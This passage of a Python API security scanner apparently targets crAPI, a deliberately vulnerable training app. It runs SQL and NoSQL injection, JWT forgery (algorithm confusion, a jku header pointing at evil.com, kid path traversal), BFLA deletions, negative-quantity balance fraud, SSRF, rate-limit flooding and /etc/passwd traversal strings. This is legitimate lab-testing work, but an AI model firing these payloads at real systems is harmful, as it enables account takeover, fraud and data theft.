            ("GET", "/workshop/api/shop/orders/all", {"limit": 100, "offset": 0}),
        ]
        for method, endpoint, payload in exposure_endpoints:
            result = self.test_endpoint(
                method, endpoint, payload,
                "Excessive Data Exposure (Challenge 4 & 5)", Severity.MEDIUM,
                f"Testing for excessive data exposure on {endpoint}"
            )
            if result.status_code == 200:
                # Check if response contains excessive user data
                if self.detect_excessive_data_exposure(result.response_body, payload):
                    result.vulnerable = True
                    result.description = f"Excessive data exposure detected - Challenge 4/5"
            self.print_result(result)
            time.sleep(0.1)
        
        # Challenge 6: Rate Limiting - DoS with contact mechanic
        print(f"  {Colors.CYAN}Challenge 6: Testing Rate Limiting - Contact Mechanic DoS{Colors.END}")
        if self.auth_token:
            contact_payload = {
                "mechanic_api": "test",
                "mechanic_email": "test@example.com",
                "mechanic_id": 1,
                "problem_details": "DoS test"
            }
            start_time = time.time()
            request_count = 0
            
            for i in range(50):  # Try 50 requests
                try:
                    response = self.session.post(
                        f"{self.base_url}/workshop/api/merchant/contact_mechanic",
                        json=contact_payload,
                        headers=self.get_headers(),
                        timeout=self.timeout
                    )
                    request_count += 1
                    if response.status_code == 429:
                        result = TestResult(
                            endpoint="/workshop/api/merchant/contact_mechanic",
                            method="POST",
                            vulnerability="Rate Limiting (Challenge 6)",
                            payload=str(contact_payload),
                            status_code=429,
                            response_time=time.time() - start_time,
                            response_body="Rate limit detected",
                            severity=Severity.INFO,
                            description="Rate limiting is enabled - Challenge 6",
                            vulnerable=False
                        )
                        self.results.append(result)
                        self.print_result(result)
                        break
                    time.sleep(0.02)  # Very fast requests
                except:
                    pass
            
            elapsed = time.time() - start_time
            if request_count >= 40:  # Made 40+ requests without rate limit
                result = TestResult(
                    endpoint="/workshop/api/merchant/contact_mechanic",
                    method="POST",
                    vulnerability="Rate Limiting (Challenge 6)",
                    payload=str(contact_payload),
                    status_code=200,
                    response_time=elapsed,
                    response_body=f"Made {request_count} requests without rate limiting",
                    severity=Severity.MEDIUM,
                    description=f"No rate limiting - DoS possible with {request_count} requests - Challenge 6",
                    vulnerable=True
                )
                self.results.append(result)
                self.print_result(result)
        
        # Challenge 7: BFLA - Delete video of another user
        print(f"  {Colors.CYAN}Challenge 7: Testing BFLA - Delete video of another user{Colors.END}")
        # Test admin endpoint to delete videos
        for video_id in [1, 2, 3, 999, 9999]:
            result = self.test_endpoint(
                "DELETE", f"/identity/api/v2/admin/videos/{video_id}", {},
                "BFLA - Delete Video (Challenge 7)", Severity.CRITICAL,
                f"Testing admin delete endpoint for video {video_id}"
            )
            # If we can delete with regular user token, it's BFLA
            if result.status_code in [200, 204]:
                result.vulnerable = True
                result.description = f"BFLA: Can delete video {video_id} - Challenge 7"
            self.print_result(result)
            time.sleep(0.1)
        
        # Challenge 8 & 9: Mass Assignment - Get item for free / Increase balance
        print(f"  {Colors.CYAN}Challenge 8 & 9: Testing Mass Assignment - Order manipulation{Colors.END}")
        # Solution: Use negative quantity values in POST /workshop/api/shop/orders
        if self.auth_token:
            # First, try to get a product ID
            product_id = 1
            try:
                products_resp = self.session.get(
                    f"{self.base_url}/workshop/api/shop/products",
                    headers=self.get_headers(),
                    timeout=self.timeout
                )
                if products_resp.status_code == 200:
                    try:
                        products_data = products_resp.json()
                        if isinstance(products_data, list) and len(products_data) > 0:
                            product_id = products_data[0].get('id', 1)
                    except:
                        pass
            except:
                pass
            
            # Test with negative quantity (as per solution)
            negative_quantity_payloads = [
                {"product_id": product_id, "quantity": -1},
                {"product_id": product_id, "quantity": -10},
                {"product_id": product_id, "quantity": -100},  # Challenge 9: Increase balance by $1000+
            ]
            
            for payload in negative_quantity_payloads:
                result = self.test_endpoint(
                    "POST", "/workshop/api/shop/orders", payload,
                    "Mass Assignment - Negative Quantity (Challenge 8 & 9)", Severity.HIGH,
                    f"Testing negative quantity {payload['quantity']} to increase balance"
                )
                if result.status_code == 200:
                    # Check if balance increased (credit field in response)
                    try:
                        import json
                        resp_json = json.loads(result.response_body)
                        if isinstance(resp_json, dict):
                            # Check for credit/balance in response
                            if 'credit' in resp_json or 'balance' in resp_json:
                                result.vulnerable = True
                                result.description = f"Negative quantity accepted - balance manipulation possible - Challenge 8/9"
                    except:
                        if 'credit' in result.response_body.lower() or 'balance' in result.response_body.lower():
                            result.vulnerable = True
                            result.description = f"Negative quantity accepted - balance manipulation possible - Challenge 8/9"
                self.print_result(result)
                time.sleep(0.1)
        
        # Challenge 10: Mass Assignment - Update internal video properties
        print(f"  {Colors.CYAN}Challenge 10: Testing Mass Assignment - Video properties{Colors.END}")
        if self.auth_token:
            for video_id in [1, 2, 3]:
                # Try to update video with internal properties
                internal_props = [
                    {"internal_property": "hacked", "is_processed": True},
                    {"internal_property": "admin", "processed_by": "admin"},
                    {"internal": True, "admin_only": True},
                ]
                
                for props in internal_props:
                    result = self.test_endpoint(
                        "PUT", f"/identity/api/v2/user/videos/{video_id}", props,
                        "Mass Assignment - Video (Challenge 10)", Severity.HIGH,
                        f"Testing internal video property update for video {video_id}"
                    )
                    if result.status_code == 200:
                        # Create a mock response object for detect_vulnerability
                        class MockResponse:
                            def __init__(self, status_code):
                                self.status_code = status_code
                        
                        mock_response = MockResponse(result.status_code)
                        if self.detect_vulnerability(mock_response, result.response_body, "Mass Assignment", props):
                            result.vulnerable = True
                            result.description = f"Internal video properties updated - Challenge 10"
                    self.print_result(result)
                    time.sleep(0.1)
        
        # Challenge 11: SSRF - Make crAPI call external URL
        print(f"  {Colors.CYAN}Challenge 11: Testing SSRF - External URL calls{Colors.END}")
        ssrf_external_urls = [
            "http://www.google.com",
            "https://www.google.com",
            "http://example.com",
            "https://httpbin.org/get",
        ]
        
        ssrf_endpoints = [
            ("POST", "/identity/api/v2/user/pictures", {"image_url": None}),
            ("POST", "/workshop/api/shop/products", {"image_url": None, "name": "test", "price": "10.00"}),
        ]
        
        for method, endpoint, base_payload in ssrf_endpoints:
            for url in ssrf_external_urls:
                test_payload = base_payload.copy()
                for key in test_payload.keys():
                    if test_payload[key] is None:
                        test_payload[key] = url
                
                result = self.test_endpoint(
                    method, endpoint, test_payload,
                    "SSRF - External URL (Challenge 11)", Severity.HIGH,
                    f"Testing SSRF with external URL: {url}"
                )
                # Check if external URL was processed
                if result.status_code == 200:
                    if url.replace("http://", "").replace("https://", "").lower() in result.response_body.lower():
                        result.vulnerable = True
                        result.description = f"SSRF: External URL {url} was processed - Challenge 11"
                self.print_result(result)
                time.sleep(0.1)
        
        # Challenge 12: NoSQL Injection - Get free coupons
        print(f"  {Colors.CYAN}Challenge 12: Testing NoSQL Injection - Free coupons{Colors.END}")
        # Solution: The endpoint accepts bson.M directly, so we can use NoSQL operators
        # The endpoint unmarshals JSON directly to bson.M, making it vulnerable
        nosql_coupon_payloads = [
            {"coupon_code": {"$ne": ""}},  # Not equal to empty string
            {"coupon_code": {"$exists": True}},  # Exists
            {"coupon_code": {"$regex": ".*"}},  # Regex match all
            {"coupon_code": {"$gt": ""}},  # Greater than empty string
            {"coupon_code": {"$nin": [""]}},  # Not in empty array
        ]
        
        for payload in nosql_coupon_payloads:
            result = self.test_endpoint(
                "POST", "/community/api/v2/coupon/validate-coupon", payload,
                "NoSQL Injection - Coupons (Challenge 12)", Severity.HIGH,
                f"Testing NoSQL injection with {list(payload['coupon_code'].keys())[0]} operator"
            )
            # If we get 200 with coupon data, NoSQL injection worked
            if result.status_code == 200:
                try:
                    import json
                    resp_json = json.loads(result.response_body)
                    if isinstance(resp_json, dict) and any(key in resp_json for key in ['coupon_code', 'amount', 'valid']):
                        # Check if we got a valid coupon response
                        if 'coupon_code' in resp_json and resp_json.get('coupon_code'):
                            result.vulnerable = True
                            result.description = f"NoSQL injection successful - got coupon: {resp_json.get('coupon_code', 'unknown')} - Challenge 12"
                except:
                    if any(indicator in result.response_body.lower() for indicator in ['coupon_code', 'amount']):
                        result.vulnerable = True
                        result.description = "NoSQL injection successful - free coupon obtained - Challenge 12"
            self.print_result(result)
            time.sleep(0.1)
        
        # Challenge 13: SQL Injection - Redeem already claimed coupon
        print(f"  {Colors.CYAN}Challenge 13: Testing SQL Injection - Redeem claimed coupon{Colors.END}")
        # This would require knowing a coupon code first, but we can test SQL injection patterns
        sql_coupon_payloads = [
            {"coupon_code": "TEST' OR '1'='1"},
            {"coupon_code": "TEST' OR 1=1--"},
            {"coupon_code": "TEST'; UPDATE coupon SET claimed=false WHERE code='TEST';--"},
        ]
        
        for payload in sql_coupon_payloads:
            result = self.test_endpoint(
                "POST", "/community/api/v2/coupon/validate-coupon", payload,
                "SQL Injection - Coupons (Challenge 13)", Severity.HIGH,
                "Testing SQL injection to redeem already claimed coupon"
            )
            # Check for SQL injection success
            # Create a mock response object for detect_vulnerability
            class MockResponse:
                def __init__(self, status_code):
                    self.status_code = status_code
            
            mock_response = MockResponse(result.status_code)
            if self.detect_vulnerability(mock_response, result.response_body, "SQL Injection", payload):
                result.vulnerable = True
                result.description = "SQL injection detected - Challenge 13"
            self.print_result(result)
            time.sleep(0.1)
        
        # Challenge 14: Unauthenticated Access
        print(f"  {Colors.CYAN}Challenge 14: Testing Unauthenticated Access{Colors.END}")
        # Test endpoints that should require auth but don't
        unauthenticated_endpoints = [
            ("GET", "/workshop/api/mechanic/receive_report", {"mechanic_code": "test", "vin": "test", "problem_details": "test"}),
            ("GET", "/workshop/api/mechanic/mechanic_report", {"report_id": "1"}),
            ("GET", "/identity/api/v2/user/dashboard", {}),
        ]
        
        if self.auth_token:
            old_token = self.auth_token
            self.auth_token = None
            
            for method, endpoint, payload in unauthenticated_endpoints:
                result = self.test_endpoint(
                    method, endpoint, payload,
                    "Unauthenticated Access (Challenge 14)", Severity.CRITICAL,
                    f"Testing {endpoint} without authentication"
                )
                # If we get 200 without auth, it's unauthenticated access
                if result.status_code == 200 and len(result.response_body) > 50:
                    try:
                        import json
                        resp_json = json.loads(result.response_body)
                        if isinstance(resp_json, (dict, list)):
                            result.vulnerable = True
                            result.description = f"Unauthenticated access to {endpoint} - Challenge 14"
                    except:
                        if not any(err in result.response_body.lower() for err in ["error", "unauthorized", "forbidden"]):
                            result.vulnerable = True
                            result.description = f"Unauthenticated access to {endpoint} - Challenge 14"
                self.print_result(result)
                time.sleep(0.1)
            
            self.auth_token = old_token
        
        # Challenge 15: JWT Vulnerabilities (all 4 methods from solution)
        print(f"  {Colors.CYAN}Challenge 15: Testing JWT Vulnerabilities (all methods){Colors.END}")
        if self.auth_token:
            import base64
            import json
            import hmac
            import hashlib
            
            try:
                parts = self.auth_token.split('.')
                if len(parts) == 3:
                    # Get original header and payload
                    header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
                    payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                    header = json.loads(base64.urlsafe_b64decode(header_padded).decode())
                    payload_data = json.loads(base64.urlsafe_b64decode(payload_padded).decode())
                    
                    # Method 1: Algorithm Confusion (RS256 -> HS256)
                    # Get public key from JWKS endpoint
                    try:
                        jwks_resp = self.session.get(
                            f"{self.base_url}/.well-known/jwks.json",
                            timeout=self.timeout
                        )
                        if jwks_resp.status_code == 200:
                            jwks_data = jwks_resp.json()
                            if 'keys' in jwks_data and len(jwks_data['keys']) > 0:
                                # Extract public key and convert to base64 (simplified - would need proper JWK parsing)
                                # For now, we'll test with a known approach
                                header['alg'] = 'HS256'
                                header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                                # Use a test secret (in real exploit, would use base64 encoded public key)
                                secret = "test_secret"
                                signature = base64.urlsafe_b64encode(
                                    hmac.new(secret.encode(), f"{header_encoded}.{parts[1]}".encode(), hashlib.sha256).digest()
                                ).decode().rstrip('=')
                                token_hs256 = f"{header_encoded}.{parts[1]}.{signature}"
                                
                                old_token = self.auth_token
                                self.auth_token = token_hs256
                                result = self.test_endpoint(
                                    "GET", "/identity/api/v2/user/dashboard", {},
                                    "JWT Algorithm Confusion (Challenge 15)", Severity.CRITICAL,
                                    "Testing JWT algorithm confusion RS256->HS256"
                                )
                                if result.status_code == 200:
                                    result.vulnerable = True
                                    result.description = "JWT Algorithm confusion successful - Challenge 15"
                                self.print_result(result)
                                self.auth_token = old_token
                    except:
                        pass
                    
                    # Method 2: Invalid Signature (Dashboard doesn't validate)
                    # Change sub to different user email
                    payload_data['sub'] = 'admin@example.com'
                    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
                    # Keep original signature (invalid)
                    token_invalid_sig = f"{parts[0]}.{payload_encoded}.{parts[2]}"
                    
                    old_token = self.auth_token
                    self.auth_token = token_invalid_sig
                    result = self.test_endpoint(
                        "GET", "/identity/api/v2/user/dashboard", {},
                        "JWT Invalid Signature (Challenge 15)", Severity.CRITICAL,
                        "Testing JWT with invalid signature (dashboard bypass)"
                    )
                    if result.status_code == 200:
                        result.vulnerable = True
                        result.description = "JWT Invalid signature accepted by dashboard - Challenge 15"
                    self.print_result(result)
                    self.auth_token = old_token
                    
                    # Method 3: JKU Misuse
                    header['jku'] = 'http://evil.com/jwks.json'
                    header['kid'] = 'evil-key'
                    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                    token_jku = f"{header_encoded}.{parts[1]}.{parts[2]}"
                    
                    self.auth_token = token_jku
                    result = self.test_endpoint(
                        "GET", "/identity/api/v2/user/dashboard", {},
                        "JWT JKU Misuse (Challenge 15)", Severity.CRITICAL,
                        "Testing JWT with JKU header pointing to external URL"
                    )
                    if result.status_code == 200:
                        result.vulnerable = True
                        result.description = "JWT JKU misuse successful - Challenge 15"
                    self.print_result(result)
                    self.auth_token = old_token
                    
                    # Method 4: KID Path Traversal
                    header['kid'] = '../../../../../../dev/null'
                    header['alg'] = 'HS256'
                    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                    # AA== is base64 for null byte
                    secret_null = "AA=="
                    signature = base64.urlsafe_b64encode(
                        hmac.new(secret_null.encode(), f"{header_encoded}.{parts[1]}".encode(), hashlib.sha256).digest()
                    ).decode().rstrip('=')
                    token_kid = f"{header_encoded}.{parts[1]}.{signature}"
                    
                    self.auth_token = token_kid
                    result = self.test_endpoint(
                        "GET", "/identity/api/v2/user/dashboard", {},
                        "JWT KID Path Traversal (Challenge 15)", Severity.CRITICAL,
                        "Testing JWT with KID path traversal to /dev/null"
                    )
                    if result.status_code == 200:
                        result.vulnerable = True
                        result.description = "JWT KID path traversal successful - Challenge 15"
                    self.print_result(result)
                    self.auth_token = old_token
            except Exception as e:
                pass
    
    def test_unexpected_inputs(self):
        """Test endpoints with unexpected inputs: type confusion, boundary values, malformed data"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing Unexpected Inputs{Colors.END}")
        
        # Define unexpected input patterns
        unexpected_strings = [
            "",  # Empty string
            " ",  # Whitespace
            "\x00",  # Null byte
            "\n\r\t",  # Control characters
            "A" * 10000,  # Very long string
            "null",  # String "null"
            "undefined",  # String "undefined"
            "true",  # String "true"
            "false",  # String "false"
            "../../../etc/passwd",  # Path traversal string
            "<script>alert(1)</script>",  # XSS attempt
            "'; DROP TABLE users; --",  # SQL injection string
            "{{$ne: null}}",  # NoSQL injection string
            "http://evil.com",  # URL string
            "file:///etc/passwd",  # File protocol
            "javascript:alert(1)",  # JavaScript protocol
            "\\x00\\x01\\x02",  # Hex encoded
            "\u0000\u0001\u0002",  # Unicode nulls
            "💣💥🔥",  # Emoji
            "测试",  # Non-ASCII
            "🚨' OR '1'='1",  # Mixed
        ]
        
        unexpected_numbers = [
            0,
            -1,
            -999999,
            999999999,
            2147483647,  # Max 32-bit int
            -2147483648,  # Min 32-bit int
            9223372036854775807,  # Max 64-bit int
            -9223372036854775808,  # Min 64-bit int
            0.0,
            -0.0,
            0.0000001,
            999999.999999,
            float('inf'),
            float('-inf'),
            float('nan'),
        ]
        
        unexpected_arrays = [
            [],
            [None],
            [""],
            [0],
            [-1],
            [999999],
            ["", "", ""],
            [None, None, None],
            [[], [], []],  # Nested arrays
            [{"test": "value"}],  # Array with object
        ]
        
        unexpected_objects = [
            {},
            {"": ""},
            {"null": None},
            {"undefined": "undefined"},
            {"true": True, "false": False},
            {"nested": {"deep": {"value": "test"}}},  # Deep nesting
            {"array": [1, 2, 3]},
            {"recursive": None},  # Would be circular if set
        ]
        
        unexpected_special = [
            None,
            True,
            False,
            "null",
            "undefined",
            "NaN",
            "Infinity",
            "-Infinity",
        ]
        
        # Test endpoints with unexpected inputs
        test_endpoints = [
            # Auth endpoints
            ("POST", "/identity/api/auth/login", {"email": None, "password": None}),
            ("POST", "/identity/api/auth/signup", {"email": None, "name": None, "number": None, "password": None}),
            ("POST", "/identity/api/auth/forget-password", {"email": None}),
            
            # User endpoints
            ("GET", "/identity/api/v2/user/dashboard", {}),
            ("POST", "/identity/api/v2/user/pictures", {"image_url": None}),
            ("POST", "/identity/api/v2/user/videos", {"video_url": None}),
            
            # Vehicle endpoints
            ("POST", "/identity/api/v2/vehicle/add_vehicle", {"vin": None, "pincode": None}),
            ("GET", "/identity/api/v2/vehicle/vehicles", {}),
            
            # Shop endpoints
            ("POST", "/workshop/api/shop/orders", {"product_id": None, "quantity": None}),
            ("GET", "/workshop/api/shop/products", {}),
            
            # Community endpoints
            ("POST", "/community/api/v2/community/posts", {"content": None, "title": None}),
            ("POST", "/community/api/v2/coupon/validate-coupon", {"coupon_code": None}),
        ]
        
        # Test type confusion on each endpoint
        for method, endpoint, base_payload in test_endpoints:
            # Test with unexpected string values
            for field in base_payload.keys():
                for unexpected_val in unexpected_strings[:5]:  # Test first 5 to avoid too many requests
                    test_payload = base_payload.copy()
                    test_payload[field] = unexpected_val
                    
                    result = self.test_endpoint(
                        method, endpoint, test_payload,
                        "Unexpected Input - String Type", Severity.MEDIUM,
                        f"Testing {endpoint} with unexpected string value for {field}"
                    )
                    # Check for errors that reveal information
                    if result.status_code in [400, 500] and len(result.response_body) > 100:
                        if self.detect_information_disclosure(result.response_body):
                            result.vulnerable = True
                            result.description = f"Information disclosure with unexpected string input - {field}"
                    self.print_result(result)
                    time.sleep(0.05)
            
            # Test with unexpected number values
            for field in base_payload.keys():
                for unexpected_num in unexpected_numbers[:5]:
                    test_payload = base_payload.copy()
                    test_payload[field] = unexpected_num
                    
                    result = self.test_endpoint(
                        method, endpoint, test_payload,
                        "Unexpected Input - Number Type", Severity.MEDIUM,
                        f"Testing {endpoint} with unexpected number value for {field}"
                    )
                    # Check for integer overflow, underflow, or type confusion
                    if result.status_code == 200:
                        # Check if unexpected number was accepted when it shouldn't be
                        if isinstance(unexpected_num, (int, float)) and (unexpected_num < 0 or unexpected_num > 1000):
                            result.vulnerable = True
                            result.description = f"Unexpected number value accepted: {unexpected_num} for {field}"
                    elif result.status_code in [400, 500]:
                        if self.detect_information_disclosure(result.response_body):
                            result.vulnerable = True
                            result.description = f"Information disclosure with unexpected number - {field}"
                    self.print_result(result)
                    time.sleep(0.05)
            
            # Test with type confusion (string where number expected, etc.)
            type_confusion_tests = [
                {"product_id": "string_instead_of_number", "quantity": 1},
                {"product_id": 1, "quantity": "string_instead_of_number"},
                {"email": 12345, "password": "test"},
                {"email": ["array", "instead", "of", "string"], "password": "test"},
                {"email": {"object": "instead", "of": "string"}, "password": "test"},
                {"coupon_code": 12345},  # Number instead of string
                {"coupon_code": ["array", "value"]},  # Array instead of string
                {"coupon_code": {"$ne": ""}},  # Object instead of string (NoSQL)
            ]
            
            for confusion_payload in type_confusion_tests:
                # Merge with base payload
                test_payload = {**base_payload, **confusion_payload}
                
                result = self.test_endpoint(
                    method, endpoint, test_payload,
                    "Unexpected Input - Type Confusion", Severity.HIGH,
                    f"Testing {endpoint} with type confusion"
                )
                # Check if type confusion was exploited
                if result.status_code == 200:
                    # If we get 200 with wrong types, might be vulnerable
                    result.vulnerable = True
                    result.description = "Type confusion - wrong data types accepted"
                elif result.status_code in [400, 500]:
                    if self.detect_information_disclosure(result.response_body):
                        result.vulnerable = True
                        result.description = "Information disclosure with type confusion"
                self.print_result(result)
                time.sleep(0.05)
        
        # Test with missing required fields
        print(f"  {Colors.CYAN}Testing Missing Required Fields{Colors.END}")
        missing_field_tests = [
            ("POST", "/identity/api/auth/login", {}),  # No email, no password
            ("POST", "/identity/api/auth/signup", {}),  # No fields
            ("POST", "/identity/api/auth/forget-password", {}),  # No email
            ("POST", "/workshop/api/shop/orders", {}),  # No product_id, quantity
            ("POST", "/community/api/v2/coupon/validate-coupon", {}),  # No coupon_code
        ]
        
        for method, endpoint, payload in missing_field_tests:
            result = self.test_endpoint(
                method, endpoint, payload,
                "Unexpected Input - Missing Fields", Severity.LOW,
                f"Testing {endpoint} with missing required fields"
            )
            # Check for information disclosure in error messages
            if result.status_code in [400, 422, 500]:
                if self.detect_information_disclosure(result.response_body):
                    result.vulnerable = True
                    result.description = "Information disclosure when required fields missing"
            self.print_result(result)
            time.sleep(0.05)
        
        # Test with extra unexpected fields
        print(f"  {Colors.CYAN}Testing Extra Unexpected Fields{Colors.END}")
        extra_field_tests = [
            ("POST", "/identity/api/auth/login", {"email": "test@test.com", "password": "test", "admin": True, "role": "admin"}),
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 1, "price": 0, "discount": 100, "refund_amount": 9999}),
            ("POST", "/identity/api/v2/user/videos", {"video_url": "test", "internal_property": "hacked", "is_processed": True}),
        ]
        
        for method, endpoint, payload in extra_field_tests:
            result = self.test_endpoint(
                method, endpoint, payload,
                "Unexpected Input - Extra Fields", Severity.HIGH,
                f"Testing {endpoint} with extra unexpected fields (mass assignment test)"
            )
            # Check if extra fields were processed (mass assignment)
            if result.status_code == 200:
                # Create a mock response object for detect_vulnerability
                class MockResponse:
                    def __init__(self, status_code):
                        self.status_code = status_code
                
                mock_response = MockResponse(result.status_code)
                if self.detect_vulnerability(mock_response, result.response_body, "Mass Assignment", payload):
                    result.vulnerable = True
                    result.description = "Mass assignment - extra fields processed"
            self.print_result(result)
            time.sleep(0.05)
        
        # Test with boundary values
        print(f"  {Colors.CYAN}Testing Boundary Values{Colors.END}")
        boundary_tests = [
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 0}),
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": -1}),
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 2147483647}),
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": -2147483648}),
            ("GET", "/workshop/api/shop/orders/all", {"limit": 0, "offset": 0}),
            ("GET", "/workshop/api/shop/orders/all", {"limit": -1, "offset": 0}),
            ("GET", "/workshop/api/shop/orders/all", {"limit": 999999, "offset": 0}),
        ]
        
        for method, endpoint, payload in boundary_tests:
            result = self.test_endpoint(
                method, endpoint, payload,
                "Unexpected Input - Boundary Values", Severity.MEDIUM,
                f"Testing {endpoint} with boundary values"
            )
            # Check for integer overflow/underflow or unexpected behavior
            if result.status_code == 200:
                # Negative quantity might increase balance (Challenge 8/9)
                if "quantity" in payload and payload["quantity"] < 0:
                    if "credit" in result.response_body.lower() or "balance" in result.response_body.lower():
                        result.vulnerable = True
                        result.description = "Boundary value exploit - negative quantity accepted"
            self.print_result(result)
            time.sleep(0.05)
        
        # Test with array/object manipulation
        print(f"  {Colors.CYAN}Testing Array/Object Manipulation{Colors.END}")
        array_object_tests = [
            ("POST", "/workshop/api/shop/orders", {"product_id": [1, 2, 3], "quantity": 1}),  # Array instead of number
            ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": [1, 2, 3]}),  # Array instead of number
            ("POST", "/identity/api/auth/login", {"email": {"$ne": ""}, "password": "test"}),  # Object instead of string
            ("POST", "/community/api/v2/coupon/validate-coupon", {"coupon_code": {"$ne": "", "$exists": True}}),  # Complex object
        ]
        
        for method, endpoint, payload in array_object_tests:
            result = self.test_endpoint(
                method, endpoint, payload,
                "Unexpected Input - Array/Object", Severity.HIGH,
                f"Testing {endpoint} with array/object manipulation"
            )
            # Check for NoSQL injection or type confusion
            if result.status_code == 200:
                # If object with operators was accepted, might be NoSQL injection
                if any(isinstance(v, dict) and any(k.startswith('$') for k in v.keys()) for v in payload.values()):
                    result.vulnerable = True
                    result.description = "NoSQL injection via object manipulation"
            self.print_result(result)
            time.sleep(0.05)
        
        # Test with encoding issues
        print(f"  {Colors.CYAN}Testing Encoding Issues{Colors.END}")
        encoding_tests = [
            ("POST", "/identity/api/auth/login", {"email": "%00test@test.com", "password": "test"}),
            ("POST", "/identity/api/auth/login", {"email": "test%2F@test.com", "password": "test"}),
            ("POST", "/identity/api/auth/login", {"email": "test%00@test.com", "password": "test"}),
            ("GET", "/identity/api/v2/vehicle/vehicles", {}),
        ]
        
        for method, endpoint, payload in encoding_tests:
            result = self.test_endpoint(
                method, endpoint, payload,
                "Unexpected Input - Encoding", Severity.MEDIUM,
                f"Testing {endpoint} with encoding issues"
            )
            if result.status_code in [400, 500]:
                if self.detect_information_disclosure(result.response_body):
                    result.vulnerable = True
                    result.description = "Information disclosure with encoding issues"
            self.print_result(result)
            time.sleep(0.05)
    
    def test_all_endpoints_from_spec(self):
        """Parse OpenAPI spec and test ALL endpoints with extreme inputs based on expected types"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing All Endpoints from OpenAPI Spec with Extreme Inputs{Colors.END}")
        
        try:
            import json
            spec_path = "openapi-spec/crapi-openapi-spec.json"
            with open(spec_path, 'r') as f:
                spec = json.load(f)
            
            paths = spec.get('paths', {})
            endpoints_tested = 0
            
            for path, methods in paths.items():
                for method, details in methods.items():
                    if method.upper() not in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                        continue
                    
                    endpoints_tested += 1
                    request_body = details.get('requestBody', {})
                    parameters = details.get('parameters', [])
                    
                    # Extract expected parameter types from schema
                    expected_params = {}
                    
                    # Get parameters from requestBody
                    if request_body:
                        content = request_body.get('content', {})
                        for content_type, content_details in content.items():
                            schema = content_details.get('schema', {})
                            if 'properties' in schema:
                                for param_name, param_schema in schema['properties'].items():
                                    param_type = param_schema.get('type', 'string')
                                    expected_params[param_name] = param_type
                    
                    # Get parameters from query/path
                    for param in parameters:
                        param_name = param.get('name')
                        param_schema = param.get('schema', {})
                        param_type = param_schema.get('type', 'string')
                        param_in = param.get('in', 'query')
                        if param_name:
                            expected_params[f"{param_in}:{param_name}"] = param_type
                    
                    # Generate extreme inputs based on expected types
                    extreme_payloads = []
                    
                    if expected_params:
                        # For each expected parameter, create extreme inputs
                        for param_name, expected_type in expected_params.items():
                            # Skip path parameters (we'll test those separately)
                            if param_name.startswith('path:'):
                                continue
                            
                            # Remove prefix for payload
                            clean_name = param_name.split(':')[-1]
                            
                            if expected_type == 'string':
                                # Test with numbers, booleans, arrays, objects
                                extreme_payloads.extend([
                                    {clean_name: 12345},
                                    {clean_name: -1},
                                    {clean_name: True},
                                    {clean_name: False},
                                    {clean_name: []},
                                    {clean_name: {}},
                                    {clean_name: None},
                                ])
                            elif expected_type in ['integer', 'number']:
                                # Test with strings, booleans, arrays, objects
                                extreme_payloads.extend([
                                    {clean_name: "George"},  # String when number expected
                                    {clean_name: "123abc"},
                                    {clean_name: True},
                                    {clean_name: False},
                                    {clean_name: []},
                                    {clean_name: {}},
                                    {clean_name: None},
                                    {clean_name: -1},  # Negative when positive expected
                                    {clean_name: 0},  # Zero
                                    {clean_name: 999999999999},  # Very large
                                ])
                            elif expected_type == 'boolean':
                                # Test with strings, numbers, arrays, objects
                                extreme_payloads.extend([
                                    {clean_name: "true"},
                                    {clean_name: "false"},
                                    {clean_name: 1},
                                    {clean_name: 0},
                                    {clean_name: "yes"},
                                    {clean_name: []},
                                    {clean_name: {}},
                                ])
                            elif expected_type == 'array':
                                # Test with strings, numbers, objects
                                extreme_payloads.extend([
                                    {clean_name: "not an array"},
                                    {clean_name: 12345},
                                    {clean_name: {}},
                                    {clean_name: None},
                                ])
                            elif expected_type == 'object':
                                # Test with strings, numbers, arrays
                                extreme_payloads.extend([
                                    {clean_name: "not an object"},
                                    {clean_name: 12345},
                                    {clean_name: []},
                                    {clean_name: None},
                                ])
                    
                    # If no parameters, test with empty and unexpected payloads
                    if not extreme_payloads:
                        extreme_payloads = [
                            {},
                            {"unexpected_field": "value"},
                            {"test": 123},
                            {"test": []},
                            {"test": {}},
                        ]
                    
                    # Test each extreme payload
                    for payload in extreme_payloads[:10]:  # Limit to 10 per endpoint
                        result = self.test_endpoint(
                            method.upper(), path, payload,
                            "Extreme Input - Type Confusion", Severity.HIGH,
                            f"Testing {method.upper()} {path} with wrong data types"
                        )
                        # Check for type confusion vulnerabilities
                        if result.status_code == 200:
                            # If wrong type was accepted, it's a vulnerability
                            result.vulnerable = True
                            result.description = f"Type confusion: wrong data type accepted for {path}"
                        elif result.status_code in [400, 500]:
                            if self.detect_information_disclosure(result.response_body):
                                result.vulnerable = True
                                result.description = f"Information disclosure with type confusion on {path}"
                        self.print_result(result)
                        time.sleep(0.02)
            
            print(f"  {Colors.GREEN}✓ Tested {endpoints_tested} endpoints from OpenAPI spec{Colors.END}")
        except FileNotFoundError:
            print(f"  {Colors.YELLOW}⚠ OpenAPI spec not found, skipping spec-based tests{Colors.END}")
        except Exception as e:
            print(f"  {Colors.YELLOW}⚠ Error parsing OpenAPI spec: {e}{Colors.END}")
    
    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution (HPP) attacks"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Testing HTTP Parameter Pollution{Colors.END}")
        
        hpp_endpoints = [
            ("GET", "/identity/api/v2/user/dashboard", {"id": ["1", "2"]}),
            ("GET", "/workshop/api/shop/orders/all", {"limit": ["10", "999"], "offset": ["0", "100"]}),
            ("GET", "/community/api/v2/community/posts/recent", {"limit": ["5", "1000"]}),
